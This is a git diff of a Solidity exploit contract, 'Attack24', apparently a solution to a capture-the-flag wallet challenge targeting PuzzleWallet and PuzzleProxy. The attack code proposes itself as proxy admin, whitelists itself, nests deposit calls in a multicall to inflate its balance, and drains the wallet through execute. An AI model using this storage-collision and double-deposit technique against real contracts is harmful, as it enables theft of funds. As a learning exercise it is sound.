@@ -11,7 +11,6 @@ contract Attack24 {
     event AddedToWhiteList(address indexed _address);
 
     constructor(address payable _targetAddress) {
-        // owner = msg.sender;
         target = PuzzleWallet(_targetAddress);        
         proxy = PuzzleProxy(_targetAddress);
     }
@@ -20,7 +19,7 @@ contract Attack24 {
         proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
 
-        // build deposit and multicall   <--  HERE hare (or in other words the github code)
+        // build deposit and multicall
 
         bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
         bytes[] memory deposit_sig_in_array = new bytes[](1);
@@ -40,14 +39,10 @@ contract Attack24 {
             address(target).balance
         );
 
-        target.execute(msg.sender, address(target).balance, transfer_sig);
-        target.setMaxBalance(uint256(uint160(msg.sender)));
+        target.execute(msg.sender, address(target).balance, transfer_sig);  // <-- here
+        // target.setMaxBalance(uint256(uint160(msg.sender)));
      }
 
-    // function withdraw() public view {
-    //     require(owner == msg.sender, "not allowed, sorry");
-    //     // withdraw all funds using a call()
-    // }
 }
 
 
